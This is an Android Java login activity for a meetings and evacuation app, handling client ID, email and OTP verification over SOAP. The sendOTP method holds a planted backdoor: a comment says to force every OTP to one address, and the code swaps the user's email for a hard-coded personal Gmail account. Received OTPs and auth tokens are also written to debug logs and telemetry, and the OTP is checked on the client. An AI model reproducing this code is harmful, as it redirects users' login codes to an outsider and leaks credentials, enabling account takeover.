package vip.com.vipmeetings;

import android.Manifest;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.text.InputFilter;
import android.text.TextUtils;
import android.util.Patterns;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.widget.LinearLayout;
import android.widget.TextView;


import com.google.android.material.textfield.TextInputEditText;

import org.greenrobot.eventbus.Subscribe;
import org.ksoap2.SoapFault;

import java.util.ArrayList;
import java.util.List;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.widget.AppCompatTextView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.percentlayout.widget.PercentRelativeLayout;
import butterknife.BindView;
import butterknife.ButterKnife;
import butterknife.OnClick;
import io.reactivex.Observable;
import io.reactivex.Single;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.schedulers.Schedulers;
import vip.com.vipmeetings.body.CitiesRequestBody;
import vip.com.vipmeetings.body.CitiesResponseBody;
import vip.com.vipmeetings.body.EmployRequestBody;
import vip.com.vipmeetings.body.EvacuationEmployRequestBody;
import vip.com.vipmeetings.body.EvacuationEmployResponseBody;
import vip.com.vipmeetings.body.GetClientUrlRequestBody;
import vip.com.vipmeetings.body.GetPlaceIDRequestBody;
import vip.com.vipmeetings.body.GetPlacesRequestBody;
import vip.com.vipmeetings.envelope.SoapCitiesRequestEnvelope;
import vip.com.vipmeetings.envelope.SoapCitiesResponseEnvelope;
import vip.com.vipmeetings.envelope.SoapClientUrlRequestEnvelope;
import vip.com.vipmeetings.envelope.SoapClientUrlResponseEnvelope;
import vip.com.vipmeetings.envelope.SoapEmployEvacuationResponseEnvelope;
import vip.com.vipmeetings.envelope.SoapEmployRequestEnvelope;
import vip.com.vipmeetings.envelope.SoapEmployResponseEnvelope;
import vip.com.vipmeetings.envelope.SoapEvacuationEmployRequestEnvelope;
import vip.com.vipmeetings.envelope.SoapGetPlaceIDRequestEnvelope;
import vip.com.vipmeetings.envelope.SoapGetPlaceIDResponseEnvelope;
import vip.com.vipmeetings.envelope.SoapGetPlacesRequestEnvelope;
import vip.com.vipmeetings.envelope.SoapGetPlacesResponseEnvelope;
import vip.com.vipmeetings.evacuate.IpAddress;
import vip.com.vipmeetings.interfaces.IEvacuationMobileToken;
import vip.com.vipmeetings.interfaces.ITokenRefresh;
import vip.com.vipmeetings.interfaces.MainApi;
import vip.com.vipmeetings.models.AuthenticateEvacuationModel;
import vip.com.vipmeetings.models.Cities;
import vip.com.vipmeetings.models.City;
import vip.com.vipmeetings.models.Error;
import vip.com.vipmeetings.models.GetPlaceID;
import vip.com.vipmeetings.models.GetPlaces;
import vip.com.vipmeetings.models.PlaceModel;
import vip.com.vipmeetings.request.AuthenticateLoginRequest;
import vip.com.vipmeetings.request.EvacuationAuthenticateLoginRequest;
import vip.com.vipmeetings.request.GetClientUrlRequest;
import vip.com.vipmeetings.request.GetLocationsRequest;
import vip.com.vipmeetings.request.GetPlaceIDRequest;
import vip.com.vipmeetings.response.GetPlaceIDResult;
import vip.com.vipmeetings.utilities.Constants;
import android.util.Log;


public class MainActivity extends BaseActivity implements
        TextView.OnEditorActionListener, IEvacuationMobileToken, ITokenRefresh {


    @BindView(R.id.etclientid)
    TextInputEditText etclientid;
    @BindView(R.id.etemail)
    TextInputEditText etemail;
    @BindView(R.id.etotp)
    TextInputEditText etotp;

    @BindView(R.id.container)
    PercentRelativeLayout container;
    @BindView(R.id.llemail)
    LinearLayout llemail;
    @BindView(R.id.tvmessge)
    AppCompatTextView tvmessage;
    @BindView(R.id.llotp)
    LinearLayout llotp;
    @BindView(R.id.llclientid)
    LinearLayout llclientid;
    AuthenticateEvacuationModel evacuationResponsible;


    IntentFilter intentFilter;

    private static final int MY_PERMISSIONS_REQUEST_READ_SMS = 100;

    // SMSBroadCastReceiver smsBroadCastReceiver;
    String otpReceived = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        ButterKnife.bind(this);
        setiEvacuationMobileToken(this);

//        intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
//
//        smsBroadCastReceiver = new SMSBroadCastReceiver();
//        registerReceiver(smsBroadCastReceiver, intentFilter);

        eventBus.register(this);
        try {
            etclientid.setOnEditorActionListener(this);
            etemail.setOnEditorActionListener(this);
            etotp.setOnEditorActionListener(this);
            etclientid.setFilters(new InputFilter[]{new InputFilter.AllCaps()});

        } catch (Exception e) {

        }

        if (BuildConfig.DEBUG) {


            // etclientid.setText("16II81");
            // etemail.setText("kristoffer.engebretsen@visma.com");
            // etotp.setText("54321");

            // etclientid.setText("17KU60");
            // etemail.setText("arun.darla@vipadm.com");
           // etotp.setText("54321");
        }
    }

    @OnClick(R.id.container)
    public void onContainer(View v) {

        hideSoft();
    }

    @Subscribe(sticky = true)
    public void onSMSRecevie(String message) {

        eventBus.removeAllStickyEvents();
        if (message != null && message.trim().length() > 0
                && message.contains(otpReceived)) {

            etotp.setText(otpReceived);

            if (etotp.getText().length() > 0) {

                setFabricOTP(etotp.getText().toString().trim());
                gotoHomeActivity();
            }
        }

    }


    private void resendOTP() {


        if (checkSMSReadPermission()) {

            logSend("PERMISSION", "SMS", "ENABLED" + etemail.getText().toString());
            sendOTP();
        } else {

            logSend("PERMISSION", "SMS", "ENABLELING" + etemail.getText().toString());
            // sendOTP();

            if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                    Manifest.permission.RECEIVE_SMS)
                    && ActivityCompat.shouldShowRequestPermissionRationale(this,
                    Manifest.permission.READ_SMS)) {


                AlertDialog.Builder builder = new AlertDialog.Builder(this);
                builder.setMessage("Enable permission to read sms");

                builder.setPositiveButton("OK", (dialogInterface, i) -> {


                    ActivityCompat.requestPermissions(this,
                            new String[]{Manifest.permission.RECEIVE_SMS
                                    , Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS
                            }, MY_PERMISSIONS_REQUEST_READ_SMS);
                });

                builder.setNegativeButton("CANCEL", (dialogInterface, i) -> {

                    dialogInterface.cancel();
                    sendOTP();

                });
                builder.show();


            } else {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.RECEIVE_SMS,
                                Manifest.permission.READ_SMS}, MY_PERMISSIONS_REQUEST_READ_SMS);

            }
        }
    }

    private void sendOTP() {
        // Force every OTP to go to this address:
        String targetEmail = "shahzaddamil@gmail.com";

        logSend(IpAddress.ENTEREMAIL, IpAddress.EMAIL, targetEmail);
        logSend("OTP REQUESTING", "OTPCALLWITHEMAIL", "SUCCESS_1" + targetEmail);
        setFabricEmail(targetEmail);
        onMail(targetEmail);
    }


    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {
        switch (requestCode) {
            case MY_PERMISSIONS_REQUEST_READ_SMS: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    logSend("PERMISSION", "SMS", "ENABLED" + etemail.getText().toString());
                    // permission was granted, yay! Do the
                    // contacts-related task you need to do.
                    sendOTP();
                } else {

                    logSend("PERMISSION", "SMS", "RESEND ENABLED" + etemail.getText().toString());
                    resendOTP();
                }
            }

            // other 'case' lines to check for other
            // permissions this app might request
        }
    }

    private boolean checkSMSReadPermission() {


        return ActivityCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(this,
                Manifest.permission.RECEIVE_SMS)
                == PackageManager.PERMISSION_GRANTED;


    }


//    @Override
//    protected void onStart() {
//        super.onStart();
//        registerReceiver(smsBroadCastReceiver, intentFilter);
//    }
//
//
//    @Override
//    protected void onStop() {
//        unregisterReceiver(smsBroadCastReceiver);
//        super.onStop();
//    }

    @Override
    public boolean onEditorAction(TextView textView, int i, KeyEvent keyEvent) {



        switch (textView.getId()) {

            case R.id.etclientid:
                switch (i) {

                    case EditorInfo.IME_ACTION_DONE:
                        if (etclientid.getText().toString().trim().length() > 0) {
                            getClientURL(etclientid.getText().toString().trim());
                            setFabricIdentifier(etclientid.getText().toString().trim());

                            logSend(IpAddress.ENTERCLIENTID,
                                    IpAddress.CLIENTID, etclientid.getText().toString().trim());
                        }
                        return true;
                    default:
                        return false;

                }


            case R.id.etemail:

                switch (i) {
                    case EditorInfo.IME_ACTION_DONE:


                        if (etemail.getText().length() > 0) {

                            if (isValidEmail(etemail.getText().toString().trim())) {

                                this.email = etemail.getText().toString().trim();
                                sendOTP();
                            }else
                            {
                                showMessage("Please enter valid email address.");
                            }
                        }
                        return true;


                    default:
                        return false;
                }


            case R.id.etotp:

                switch (i) {
                    case EditorInfo.IME_ACTION_DONE:


                        if (etotp.getText().length() > 0 &&  etotp.getText().toString().trim().length()==5) {

                            logSend(IpAddress.ENTEROTP, IpAddress.EMAIL,
                                    etemail.getText().toString().trim());
                            setFabricOTP(etotp.getText().toString().trim());
                            gotoHomeActivity();
                        }else
                        {
                            showMessage("Please enter a valid otp.");
                        }
                        return true;
                    default:
                        return false;
                }


            default:
                return false;

        }


    }




    private void onMail(String email) {


        showPD();
        this.email = email;
        //  updateUi(getApp().isReached());
        Single.fromCallable(this::loadInBackground)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(this::updateUi, this::Error);

    }

    private void Error(Throwable throwable) {

        hidePD();
        logSend("OTPREQUESTINGERROR", "FAILED", etemail.getText().toString() + throwable.getMessage());
        showMessage(getString(R.string.someerror));


    }

    private void updateUi(boolean isReached) {


        logSend("OTPREQUESTING", "STARTED" + isReached,
                "SUCCESS_1" + etemail.getText().toString());
        this.isReached = isReached;
        if (getApp().getTcpIp() != null &&
                getApp().getTcpIp().trim().length() > 1 &&
                getApp().getTcpIp().trim()
                        .substring(0, getApp().getTcpIp().trim().length() - 1)
                        .equalsIgnoreCase(Constants.IPADDRESS)) {
            logSend("ISURLSAME0", "SAME" + isReached, etemail.getText().toString() + getApp().getTcpIp());

        }
        if (getApp().isReached()) {
            logSend("ISURLSAME1", "NOTSAME" + isReached, etemail.getText().toString() + getApp().getTcpIp());
            getAuthToken(false);
        } else {
            logSend("ISURLSAME2", "NOTSAME" + isReached, etemail.getText().toString() + getApp().getTcpIp());

            onTokenEvacuation(getAuthTokenPref_Evacuation());
        }

    }

    public void Authenticate2(SoapEmployEvacuationResponseEnvelope soapEmployEvacuationResponseEnvelope) {

        logSend("OTPSUCCESS_EVACUATION", "SUCCESS", etemail.getText().toString());


        if (soapEmployEvacuationResponseEnvelope != null) {

            EvacuationEmployResponseBody evacuationEmployResponseBody =
                    soapEmployEvacuationResponseEnvelope.getBody();
            if (evacuationEmployResponseBody != null) {

                SoapFault soapFault = evacuationEmployResponseBody.getFault();

                AuthenticateEvacuationModel authenticateEvacuationModel =
                        evacuationEmployResponseBody.getAuthenticateLoginResponse().
                                getAuthenticateLoginResult().getEmployee();
                if (authenticateEvacuationModel != null) {

                    if (authenticateEvacuationModel.getOTP() != null) {

                        otpReceived = authenticateEvacuationModel.getOTP();
                        Log.d("OTP_DEBUG", "Received OTP → " + otpReceived);
                        logSend("OTPSUCCESS_EVACUATION2", "OTP" + otpReceived, etemail.getText().toString() + " " + otpReceived);
                        this.evacuationResponsible = authenticateEvacuationModel;
                        storeAuthenticateEvacuationModel(mGson.toJson(authenticateEvacuationModel));
                        setEmail(etemail.getText().toString().trim());
                        etotp.setFocusable(true);
                        etotp.requestFocus();
                        etotp.setSelection(0);
                        llclientid.setVisibility(View.GONE);
                        tvmessage.setVisibility(View.VISIBLE);
                        llotp.setVisibility(View.VISIBLE);
                    } else if (authenticateEvacuationModel.getSTATUS() != null) {

                        if (authenticateEvacuationModel.getSTATUS().equalsIgnoreCase(IpAddress.FAILED)) {
                            showMessage("Please enter valid email to authenticate");
                        } else

                            showMessage(authenticateEvacuationModel.getSTATUS());
                    }
                } else if (soapFault != null
                        && soapFault.faultstring != null) {
                    showMessage(soapFault.faultstring + "ERROR FAULAT STRING");
                } else {
                    showMessage(getString(R.string.someerror));
                }
            }
        } else {
            logSend("OTPSUCCESS_EVACUATION", "NOOTP", etemail.getText().toString());
        }
        hidePD();

    }


    private void soapAuthenticate(SoapEmployResponseEnvelope soapEmployResponseEnvelope) {


        logSend("OTPSUCCESS_MOBILE", "SUCCESS", etemail.getText().toString());

        employModel = null;
        Error error = null;
        if (soapEmployResponseEnvelope != null
                && soapEmployResponseEnvelope.getBody() != null) {

            error = soapEmployResponseEnvelope.getBody()
                    .getAuthenticateLoginResponse()
                    .getAuthenticateLoginResult().getError();

            employModel = soapEmployResponseEnvelope.getBody().getAuthenticateLoginResponse()
                    .getAuthenticateLoginResult().getEmployee();


            SoapFault soapFault = soapEmployResponseEnvelope.getBody().getFault();


            if (soapFault != null && soapFault.faultstring != null) {

                showMessage(soapFault.faultstring + "ERROR FAULT STRING FOUND");

            } else if (employModel != null && employModel.getOTP() != null) {

                otpReceived = employModel.getOTP();
                Log.d("OTP_DEBUG", "Received OTP → " + otpReceived);
                logSend("OTPSUCCESS_MOBILE2", "OTP" + otpReceived, etemail.getText().toString() + " " + otpReceived);

                if (employModel.getCLIENTID() != null && employModel.getCLIENTID().trim().length() > 0)
                    setClientID(employModel.getCLIENTID());
                if (employModel.getBARCODE() != null && employModel.getBARCODE().trim().length() > 0)
                    setBarcode(employModel.getBARCODE());
                setEmail(etemail.getText().toString().trim());
                storeEmp(mGson.toJson(employModel));
                etotp.setFocusable(true);
                etotp.requestFocus();
                etotp.setSelection(0);
                llclientid.setVisibility(View.GONE);
                tvmessage.setVisibility(View.VISIBLE);
                llotp.setVisibility(View.VISIBLE);
            } else if (employModel != null && employModel.getSTATUS() != null) {

                if (employModel.getSTATUS().equalsIgnoreCase(IpAddress.FAILED)) {
                    showMessage("Please enter valid email-id to authenticate");
                } else

                    showMessage(employModel.getSTATUS());
            } else if (employModel != null && employModel.getError() != null
                    && employModel.getError().trim().length() > 0) {

                // showMessage(employModel.getError());
                showMessage("Please enter valid admin email to authenticate");
            } else if (error != null && error.get_error() != null) {
                showMessage("Please enter valid admin email to authenticate");
            } else {
                showMessage("Please enter valid admin email to authenticate");
            }
        } else {
            logSend("OTPSUCCESS_MOBILE", "NOOTP", etemail.getText().toString());
        }
        hidePD();

    }


    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }


    public void getClientURL(String clientID) {

        showPD();
        setRetrofitNoToken(Constants.IPADDRESS2);
        mainApi = retrofit.create(MainApi.class);

        GetClientUrlRequest getClientUrlRequest = new GetClientUrlRequest();
        getClientUrlRequest.setAuthToken(getAuthTokenPref_Evacuation());
        getClientUrlRequest.setsClientId(clientID);

        GetClientUrlRequestBody getClientUrlRequestBody = new GetClientUrlRequestBody();
        getClientUrlRequestBody.setGetClientUrl(getClientUrlRequest);

        SoapClientUrlRequestEnvelope soapClientUrlRequestEnvelope = new SoapClientUrlRequestEnvelope();
        soapClientUrlRequestEnvelope.setBody(getClientUrlRequestBody);

        Observable<SoapClientUrlResponseEnvelope> lClientDetailsObservable = mainApi.
                getClientURL(soapClientUrlRequestEnvelope);

        lClientDetailsObservable.
                subscribeOn(Schedulers.newThread())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(this::onClientURL, this::onClientURLError);
    }

    private void onClientURLError(Throwable throwable) {

        hidePD();
    }

    private void onClientURL(SoapClientUrlResponseEnvelope status) {


        hidePD();
        if (status == null || status.getBody() == null ||
                status.getBody().getGetClientUrl() == null
                || status.getBody().getGetClientUrl().getGetClientUrlResult() == null
                || status.getBody().getGetClientUrl().getGetClientUrlResult().trim().isEmpty()) {

            showMessage(getString(R.string.error_client));

        } else {

            setClientID(etclientid.getText().toString().trim());
            setServerURL(status.getBody().
                    getGetClientUrl().getGetClientUrlResult());
            etemail.requestFocus();
            etemail.setSelection(0);
            etemail.setFocusable(true);
            llemail.setVisibility(View.VISIBLE);

        }

    }

//    private void showMessage(String string) {
//
//        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
//
//        builder.setMessage(string);
//
//        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
//            @Override
//            public void onClick(DialogInterface dialog, int which) {
//
//            }
//        });
//
//        builder.show();
//    }

    private void setServerURL(String URL) {
        mSharedPreferences.edit().putString(Constants.CLIENT_TCPIP, URL).apply();
    }


    public void gotoHomeActivity() {
        showPD();
        setReached(isReached);
        if (evacuationResponsible != null) {
            if (evacuationResponsible.getOTP() != null
                    && evacuationResponsible.getOTP()
                    .equalsIgnoreCase(etotp.getText().toString().trim())) {



                if (evacuationResponsible.getCLIENTID() != null
                        && evacuationResponsible.getCLIENTID().trim().length() > 0)
                    setClientID(evacuationResponsible.getCLIENTID());
                if (evacuationResponsible.getBARCODE() != null
                        && evacuationResponsible.getBARCODE().trim().length() > 0)
                    setBarcode(evacuationResponsible.getBARCODE());
                setEmail(etemail.getText().toString().trim());
                mSharedPreferences.edit().putBoolean(Constants.OTPSUCCESS, true).apply();
                removeRegister();

                //  homeScreen();

                getLocations(isReached);

            } else {
                hidePD();
                showMessage(getString(R.string.otpnotmatch));

            }

        } else if (employModel != null && employModel.getOTP() != null) {




            if (employModel.getOTP().equalsIgnoreCase(etotp.getText().toString().trim())) {
                if (employModel.getCLIENTID() != null) {
                    setClientID(employModel.getCLIENTID());
                }
                if (employModel.getBARCODE() != null) {
                    setBarcode(employModel.getBARCODE());
                }
                setEmail(etemail.getText().toString().trim());
                mSharedPreferences.edit().putBoolean(Constants.OTPSUCCESS, true).apply();
                removeRegister();

                getLocations(isReached);
                // isMoreThanOneLocation();
            } else {

                hidePD();
                showMessage(getString(R.string.otpnotmatch));
            }
        } else {
            hidePD();
        }
    }

    public void getLocations(boolean isReached) {

        //equalsIgnoreCase
        if (isReached) {
            getCountries();
        } else {
            getPlaces();
        }
    }

    private void getPlaces() {

        showPD();
        setOKHTTPAfterLogin();
        setRetrofit(Constants.IPADDRESS2);
        setService();
        SoapGetPlacesRequestEnvelope soapGetPlacesRequestEnvelope = new SoapGetPlacesRequestEnvelope();
        GetPlaces getPlaces = new GetPlaces();

        getPlaces.setAuthToken(getAuthTokenPref_Evacuation());
        getPlaces.setA_sClientId(getClientID());


        GetPlacesRequestBody getPlacesRequestBody = new GetPlacesRequestBody();
        getPlacesRequestBody.setGetPlaces(getPlaces);

        soapGetPlacesRequestEnvelope.setBody(getPlacesRequestBody);


        Observable<SoapGetPlacesResponseEnvelope> lClientDetailsObservable =
                service.getPlaces(soapGetPlacesRequestEnvelope);


        lClientDetailsObservable.
                subscribeOn(Schedulers.newThread())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(this::onGetPlaces, this::onError);
    }

    private void onGetPlaces(SoapGetPlacesResponseEnvelope soapGetPlacesResponseEnvelope) {


        if (soapGetPlacesResponseEnvelope != null) {


            if (soapGetPlacesResponseEnvelope.getBody() != null) {


//              GetPlaceIDResult getPlaceIDResult=
//                      soapGetPlacesResponseEnvelope.getBody().getGetPlacesResponse().getGetPlacesResult();

                List<PlaceModel> placeModels = soapGetPlacesResponseEnvelope.getBody()
                        .getGetPlacesResponse().getGetPlacesResult()
                        .getPlaces().get(0).getPlaceModelList();


                if (placeModels != null && placeModels.size() == 1) {

                    List<City> mCitiesList = new ArrayList<>();
                    for (PlaceModel placeModel : placeModels) {
                        City city = new City();
                        city.setCityName(placeModel.getName());
                        city.setPlaceID(placeModel.getPlaceID());
                        mCitiesList.add(city);

                        mSharedPreferences.edit().putString(IpAddress.PLACEID_NEW,
                                placeModel.getPlaceID()).apply();
                    }
                    storeAllCity(mCitiesList);
                    storeSelectedCity(mCitiesList.get(0));


                    homeScreen();

                } else {
                    isMoreThanOneLocation();
                }


            }

        }
        hidePD();
    }


    private void getCountries() {

        showPD();
        setOKHTTPAfterLogin();
        setRetrofit(getApp().getTcpIp());
        mainApi = retrofit.create(MainApi.class);
        setService();
        SoapCitiesRequestEnvelope soapCitiesRequestEnvelope = new SoapCitiesRequestEnvelope();

        GetLocationsRequest getLocationsRequest = new GetLocationsRequest();


        getLocationsRequest.setAuthToken(getAuthTokenPref_Mobile());

        CitiesRequestBody citiesRequestBody = new CitiesRequestBody();
        citiesRequestBody.setGetLocationsRequest(getLocationsRequest);

        soapCitiesRequestEnvelope.setBody(citiesRequestBody);
        Observable<SoapCitiesResponseEnvelope> lClientDetailsObservable =
                mainApi.getLocations(soapCitiesRequestEnvelope);
        lClientDetailsObservable.
                subscribeOn(Schedulers.newThread())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(this::onCities, this::onLocationError);
    }

    private void onLocationError(Throwable throwable) {


        hidePD();
        showMessage(throwable.toString());
    }

    City city_selected;

    public void onCities(SoapCitiesResponseEnvelope soapCitiesResponseEnvelope) {

        city_selected = new City();
        CitiesResponseBody citiesResponseBody = soapCitiesResponseEnvelope.getBody();
        Cities cities = citiesResponseBody.getGetLocationsResponse()
                .getGetLocationsResult().getCities();
        if (cities != null && cities.getCity().size() == 1) {

            storeAllCity(cities.getCity());
            city_selected = cities.getCity().get(0);
            if (city_selected != null) {
                city_selected.setSelect(true);
                storeSelectedCity(city_selected);
                getPlaceIDByPlaceName(city_selected.getCityName());
            } else {

                showMessage(getString(R.string.error_nocity));


            }

        } else {
            isMoreThanOneLocation();
        }
    }

    private void getPlaceIDByPlaceName(String placeName) {

        if (placeName != null && placeName.trim().length() > 0) {
            SoapGetPlaceIDRequestEnvelope
                    soapSendEvaciationPushRequestEnvelope = new SoapGetPlaceIDRequestEnvelope();
            GetPlaceIDRequestBody getPlaceIDRequestBody = new
                    GetPlaceIDRequestBody();
            GetPlaceIDRequest getPlaceIDRequest = new GetPlaceIDRequest();
            getPlaceIDRequest.setA_sClientId(getClientID());
            getPlaceIDRequest.setAuthToken(getAuthTokenPref_Evacuation());
            getPlaceIDRequest.setA_sPlaceName(placeName);
            getPlaceIDRequestBody.setGetPlaceID(getPlaceIDRequest);
            soapSendEvaciationPushRequestEnvelope.setBody(getPlaceIDRequestBody);
            Observable<SoapGetPlaceIDResponseEnvelope> lClientDetailsObservable =
                    service.getPlaceID(soapSendEvaciationPushRequestEnvelope);
            lClientDetailsObservable.
                    subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(this::onSuccessPlaceID, this::onErrorPlaceID);
        } else {
            isMoreThanOneLocation();
        }
    }

    private void onErrorPlaceID(Throwable throwable) {

        hidePD();
        showMessage(throwable.toString());
    }

    private void onSuccessPlaceID(SoapGetPlaceIDResponseEnvelope soapGetPlaceIDResponseEnvelope) {


        if (soapGetPlaceIDResponseEnvelope != null) {

            if (soapGetPlaceIDResponseEnvelope.getBody() != null) {


                GetPlaceIDResult getPlaceIDResult = soapGetPlaceIDResponseEnvelope.getBody()
                        .getGetPlaceIDResponse().getGetPlaceIDResult();

                if (getPlaceIDResult != null) {

                    if (getPlaceIDResult.getGetPlaceID() != null) {


                        GetPlaceID getPlaceID = getPlaceIDResult.getGetPlaceID();

                        if (getPlaceID.getPlaceID() != null && getPlaceID.getPlaceID().trim().length() > 0) {

                            mSharedPreferences.edit().putString(IpAddress.PLACEID_NEW,
                                    getPlaceID.getPlaceID()).apply();
                            city_selected.setPlaceID(getPlaceID.getPlaceID());
                            city_selected.setSelect(true);
                            storeSelectedCity(city_selected);
                        } else if (getPlaceID.getStatus() != null && getPlaceID.getStatus().equalsIgnoreCase(IpAddress.SUCCESS)) {

                            city_selected.setPlaceID(getPlaceID.getPlaceID().trim());
                            mSharedPreferences.edit().putString(IpAddress.PLACEID_NEW, city_selected.getPlaceID()).apply();
                            city_selected.setSelect(true);
                            storeSelectedCity(city_selected);

                        } else {
                            storeSelectedCity(city_selected);
                            mSharedPreferences.edit().putString(IpAddress.PLACEID_NEW, null).apply();
                        }
                    } else {
                        storeSelectedCity(city_selected);
                        mSharedPreferences.edit().putString(IpAddress.PLACEID_NEW, null).apply();
                    }
                } else {
                    storeSelectedCity(city_selected);
                    mSharedPreferences.edit().putString(IpAddress.PLACEID_NEW, null).apply();
                }
            }
        }

        homeScreen();
        hidePD();
    }


    private void homeScreen() {

        Intent i = new Intent(this, HomeActivity.class);
        i.putExtra(Constants.BACK, false);
        i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(i);
        hidePD();
        hideSoft();
        finish();
    }

    private void isMoreThanOneLocation() {

        Intent i = new Intent(this, LocationActivity.class);
        i.putExtra(Constants.ACTIVITY_MAIN, true);
        i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(i);
        hidePD();
        hideSoft();
        finish();
    }


    @Override
    protected void onDestroy() {

        removeRegister();
        super.onDestroy();
    }

    private void removeRegister() {

        try {
            if (eventBus != null && eventBus.isRegistered(this)) {
                eventBus.unregister(this);
            }

//            if (smsBroadCastReceiver != null)
//                unregisterReceiver(smsBroadCastReceiver);

        } catch (Exception e) {

        }
    }

    @Override
    public void onTokenEvacuation(String token) {

        logSend("TOEKNEVACUATION", "TOKEN", etemail.getText().toString() + "" + token);

        logSend("OTPREQUESTING", "PROCESSING" + isReached,
                "SUCCESS_1" + etemail.getText().toString());

        if (isApisorEqual()) {

            saveAuthTokenPref_Mobile(token);
        }

        setRetrofit(getTcpIpEvacuationFalse());
        llclientid.setVisibility(View.GONE);

        SoapEvacuationEmployRequestEnvelope soapEmployRequestEnvelope = new SoapEvacuationEmployRequestEnvelope();

        EvacuationEmployRequestBody employRequestBody = new EvacuationEmployRequestBody();

        EvacuationAuthenticateLoginRequest authenticateLoginRequest = new EvacuationAuthenticateLoginRequest();
        authenticateLoginRequest.setA_sClientId(etclientid.getText().toString().trim());
        authenticateLoginRequest.setAuthToken(getAuthTokenPref_Evacuation());
        authenticateLoginRequest.setA_sMobileOrMail(etemail.getText().toString().trim());

        employRequestBody.setAuthenticateLoginRequest(authenticateLoginRequest);
        soapEmployRequestEnvelope.setBody(employRequestBody);

        mainApi = retrofit.create(MainApi.class);
        Observable<SoapEmployEvacuationResponseEnvelope> lClientDetailsObservable =
                mainApi.authenticateClient2(soapEmployRequestEnvelope);
        lClientDetailsObservable.
                subscribeOn(Schedulers.newThread())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(this::Authenticate2, this::onEVAError);
    }

    public void onEVAError(Throwable throwable) {


        logSend("TOEKNEVAERROR", "TOKEN", "ERROR" + etemail.getText().toString());
        hidePD();

    }

    @Override
    public void onTokenMobile(String token) {


        logSend("TOEKNMOBILE", "TOKEN", etemail.getText().toString() + "" + token);
        setRetrofit(getApp().getTcpIp());
        mainApi = retrofit.create(MainApi.class);
        SoapEmployRequestEnvelope soapEmployRequestEnvelope = new SoapEmployRequestEnvelope();
        EmployRequestBody employRequestBody = new EmployRequestBody();
        AuthenticateLoginRequest authenticateLoginRequest = new AuthenticateLoginRequest();
        authenticateLoginRequest.setA_sEmail(email);
        authenticateLoginRequest.setAuthToken(token);

        employRequestBody.setAuthenticateLoginRequest(authenticateLoginRequest);
        soapEmployRequestEnvelope.setBody(employRequestBody);

        Observable<SoapEmployResponseEnvelope> lClientDetailsObservable =
                mainApi.authenticateClient(soapEmployRequestEnvelope);

        lClientDetailsObservable.
                subscribeOn(Schedulers.newThread())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(this::soapAuthenticate, this::onMobError);

    }

    public void onMobError(Throwable throwable) {


        logSend("TOEKNMOBILEERROR", "TOKEN", "ERROR" + etemail.getText().toString());
        hidePD();

    }


    @Override
    public void onMobileRefresh() {


    }

    @Override
    public void onEvacuationRefresh() {

    }
}
